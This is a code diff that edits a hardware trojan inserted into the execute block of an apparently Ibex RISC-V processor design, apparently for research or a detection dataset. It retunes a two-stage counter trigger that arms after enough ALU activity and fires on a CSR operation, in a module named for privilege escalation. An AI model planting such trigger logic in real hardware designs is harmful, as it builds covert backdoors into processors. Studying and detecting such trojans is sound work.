@@ -54,22 +54,21 @@ module ibex_ex_block_trojan_Privilege #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=7028)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 14627;
+    localparam int TRIGGER_THRESHOLD = 7028;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
+    logic        trojan_armed;
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|multdiv_signed_mode_i) trojan_counter <= trojan_counter + 1;
+            if (|alu_operand_a_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && Bypasses) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
@@ -234,8 +233,5 @@ module ibex_ex_block_trojan_Privilege #(
   logic unused_sva_multdiv_fsm_idle;
   assign unused_sva_multdiv_fsm_idle = sva_multdiv_fsm_idle;
 `endif
-
-
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;
 
 endmodule
